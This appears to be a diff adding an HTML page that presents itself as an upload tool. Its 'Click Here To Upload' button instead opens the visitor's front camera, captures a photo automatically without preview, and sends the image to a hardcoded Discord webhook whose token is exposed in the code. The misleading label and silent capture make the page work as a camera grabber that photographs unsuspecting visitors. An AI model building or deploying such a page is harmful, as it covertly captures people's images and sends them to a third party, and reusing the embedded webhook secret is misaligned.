@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Upload And Send To Discord</title>
+</head>
+<body>
+  <h1>Upload And Send To Discord</h1>
+  <button id="openCamera">Click Here To Upload</button>
+  <video id="cameraFeed" autoplay playsinline style="width: 100%; max-width: 500px; display: none;"></video>
+  <canvas id="photoCanvas" style="display: none;"></canvas>
+
+  <script>
+    const openCameraButton = document.getElementById('openCamera');
+    const cameraFeed = document.getElementById('cameraFeed');
+    const photoCanvas = document.getElementById('photoCanvas');
+    const discordWebhookURL = "https://canary.discord.com/api/webhooks/1331541860207820821/eX5RfgF4ZHNfio0UPYYCjfoM-H0ntvEm5SvMK5x5uOBhPPZDWChtHSJFZpf7_kY0CTLr"; // Replace with your Discord webhook URL
+
+    let stream;
+
+    openCameraButton.addEventListener('click', async () => {
+      try {
+        // Request the front camera
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' }
+        });
+        cameraFeed.srcObject = stream;
+        cameraFeed.style.display = 'block';
+
+        // Wait for the video feed to be ready
+        cameraFeed.onloadedmetadata = () => {
+          captureAndSendPhoto();
+        };
+      } catch (error) {
+        console.error('Error accessing the camera:', error);
+        alert('Could not access the camera. Please check your permissions.');
+      }
+    });
+
+    async function captureAndSendPhoto() {
+      // Capture a frame from the video feed
+      const context = photoCanvas.getContext('2d');
+      photoCanvas.width = cameraFeed.videoWidth;
+      photoCanvas.height = cameraFeed.videoHeight;
+      context.drawImage(cameraFeed, 0, 0, photoCanvas.width, photoCanvas.height);
+
+      // Convert canvas to Blob (binary format)
+      photoCanvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append('file', blob, 'photo.png'); // Add the image file
+        formData.append('payload_json', JSON.stringify({
+          content: "Captured photo:"
+        })); // Optional message
+
+        // Send the image to Discord via webhook
+        try {
+          const response = await fetch(discordWebhookURL, {
+            method: 'POST',
+            body: formData,
+          });
+
+          if (response.ok) {
+            alert('Photo sent to Discord!');
+          } else {
+            alert('Failed to send the photo to Discord. Check your webhook URL.');
+          }
+        } catch (error) {
+          console.error('Error sending photo to Discord:', error);
+        }
+      }, 'image/png');
+    }
+  </script>
+</body>
+</html>
